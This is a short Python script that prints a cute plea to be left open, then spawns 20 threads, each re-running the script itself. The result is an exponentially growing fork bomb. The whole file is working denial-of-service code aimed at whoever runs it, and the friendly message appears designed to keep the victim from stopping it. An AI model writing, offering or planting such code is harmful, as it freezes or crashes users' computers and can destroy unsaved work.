import subprocess
import threading
import sys

sys.stdout.write("\nHi hello please leave me open thanks :3")
sys.stdout.flush()

def runSelf():
	subprocess.check_call([sys.executable] + sys.argv)

threads = [threading.Thread(target=runSelf) for _ in range(20)]

for thread in threads:
    thread.start()
